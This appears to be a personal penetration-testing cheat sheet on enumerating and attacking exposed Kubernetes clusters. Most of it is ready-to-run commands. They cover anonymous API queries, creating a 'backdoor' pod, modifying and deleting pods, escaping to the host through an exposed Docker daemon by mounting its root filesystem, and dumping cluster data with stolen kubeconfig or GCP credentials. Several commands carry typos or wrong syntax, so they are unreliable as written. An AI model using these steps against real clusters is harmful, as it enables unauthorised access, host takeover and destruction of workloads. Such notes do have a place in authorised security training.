---
tags:
  - offsec/kubernetes/enumeration
---

-- --


### Enumerating k8s API - Anonymous Container Runtime

1. Check for open ports
```
nmap -p- -T4 --min-rate=400 <ip> -oN tcp_all_ports.nmap
```

2. Check services for the discovered ports
```
grep "open" tcp_all_ports.nmap | awk '{print $1}' | cut -d '/' -f 1 | paste -sd,
```

3. Confirm that k8s API service is open
![[Pasted image 20260408130654.png]]

4. Check API endpoints
```bash
curl -sk https://<ip>:<port>/      # it should return multiple endpoints if it's open
```

5. Look up for sensitive files
```bash
# Check openid configuration
curl -sk https://<ip>:<port>/.well-known/openid-configuration

# Check pods
curl -sk https://<ip>:<port>/api/v1/pods | jq -C 

# Crete a pod (backdoor example)
curl -sk https://<ip>:<port>/api/v1/namespaces/default/pods \
-H "Content-Type: application/json" \
-d '{
	"apiVersion": "v1",
	"kind": "Pod",
	"metadata": {"name": "backdoor-pod"},
	"spec": {
		"containers": [{
			"name": "alpine",
			"image": "alpine",
			"command": ["sh", "-c", "sleep 3600"]
		}]
	}
}'

# Modify existing pod
curl -k -X PATCH https://<ip>:<port>/api/v1/namespaces/default/pods/<pod-name> \
-H "Content-Type: application/merge-patch+json" \
-d '{"metadata": {"labels":{"hacked": "true"}}}'

# Delete a pod
curl -k -X DELETE https://<ip>:<port>/api/v1/namespaces/default/pods/<pod-name>

# Check running pods
curl -sk https://<ip>:<port>/runningpods/ | jq -C

# Check system logs
curl -sk https://<ip>:<port>/logs/

# Check system configuration details
curl -sk https://<ip>:<port>/configz | jq -C
```

### Kubelet slave

1. If a kubelet slave is open (`port/tcp open waste`), create a docker context to access that container
```bash
docker context create <context-name> --docker host=tcp://<ip>/<port>
```

2. Use the created context
```bash
docker context use <context-name>
```

3. Run a container inside the context
```bash
docker run --rm -it -v /:/host ubuntu bash

# -v      is mapping the host's "/" in the "/host" inside the new container
```


### Kubeconfig file

Once we have a kubeconfig file in hands, we can collect some cluster infos with that

```bash
# See permissions
kubectl --kubeconfig=kubeconfig.yaml auth can-i --list

# See cluser informaions
kubectl --kubeconfig=kubeconfig.yaml cluster-info

# If you have permissions, dump the cluster info
kubectl --kubeconfig=kubeconfig.yaml cluster-info dump

# See pods
kubectl --kubeconfig=kubeconfig.yaml get pods -n kube-system
```


### Using Cloud Credentials (Google Cloud)

```bash
# login in the GCP
gcloud auth login

# install the kubectl
gcloud components install kubectl

# install the plugins to authenticate to the cluster
gcloud components insall gke-gcloud-auth-plugin

# Get authenticated to a 3rd part clustr
gcloud container cluster get-credentials <CLUSTER_NAME> --zone <CLUSTER_ZONE> --projct <PROJECT>

# Now it's able to get cluster infos
kubectl get ns

kubectl get all -n <namespace>
```

### References

